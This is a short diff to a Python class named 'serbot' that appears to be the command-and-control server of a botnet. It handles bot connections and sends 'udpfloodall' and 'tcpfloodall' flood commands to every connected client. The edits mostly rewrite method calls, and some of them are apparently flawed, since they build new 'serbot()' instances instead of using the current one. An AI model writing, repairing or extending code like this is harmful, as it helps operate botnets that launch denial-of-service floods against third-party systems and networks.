@@ -40,7 +40,7 @@ class serbot():
 	
 	#Get Client Connections
 	def getConnections(self):
-		quitClients()
+		serbot().quitClients()
 	
 		while 1:
 			try:
@@ -153,12 +153,12 @@ class serbot():
 									break
 						except:
 							if (sendController("[SERVER - ERROR] Client closed the connection\n[INFO] Retreiving connections again...\n", q) == 0):break
-							getConnections()
+							serbot().getConnections()
 					else:
 						if (sendController("[SERVER - ERROR] Client doesn't exist\n", q) == 0): break
 	
 				elif ("udpfloodall " in command or "tcpfloodall " in command):
-					for item in allConnections:
+					for item in self.allConnections:
 						try:
 							item.send(command)
 						except:
@@ -171,7 +171,7 @@ class serbot():
 							pass
 	
 				elif(command == "quit"):
-					quitClients()
+					serbot().quitClients()
 					q.close()
 					break
 				else:
